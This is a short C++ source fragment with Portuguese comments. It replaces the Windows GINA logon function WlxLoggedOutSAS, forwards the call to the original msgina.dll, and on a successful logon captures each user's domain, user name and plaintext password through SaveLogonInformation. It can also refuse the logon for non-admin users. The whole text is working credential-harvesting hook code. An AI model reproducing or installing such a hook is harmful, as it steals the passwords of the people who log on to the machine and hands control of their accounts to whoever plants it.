// Essa funcao sobrescreve a original do Windows no momento do logon.
// No codigo abaixo gravamos os dados de autenticacao do usuario.
int
WINAPI 
My_WlxLoggedOutSAS
(
 PVOID pWlxContext,
 DWORD dwSasType, 
 PLUID pAuthenticationId, 
 PSID pLogonSid, 
 PDWORD pdwOptions, 
 PHANDLE phToken, 
 PWLX_MPR_NOTIFY_INFO pNprNotifyInfo, 
 PVOID* pProfile
 )
{
   FWlxLoggedOutSAS *WlxLoggedOutSAS = reinterpret_cast<FWlxLoggedOutSAS*>(
      GetProcAddress(g_msginaDll, "WlxLoggedOutSAS") );

   int ret = WlxLoggedOutSAS(pWlxContext, dwSasType, pAuthenticationId, 
      pLogonSid, pdwOptions, phToken, pNprNotifyInfo, pProfile);

   if( ret == WLX_SAS_ACTION_LOGON )
   {
      tstringstream userName;
      tstringstream password;

      // Domain\User
      userName << pNprNotifyInfo->pszDomain << '\\' 
         << pNprNotifyInfo->pszUserName;

      password << pNprNotifyInfo->pszPassword;

      if( SaveLogonInformation(userName.str(), password.str()) > 5 )
         if( !IsNetworkAdmin(userName.str(), pNprNotifyInfo->pszDomain) )
            ret = 0;
   }

   return ret;
}
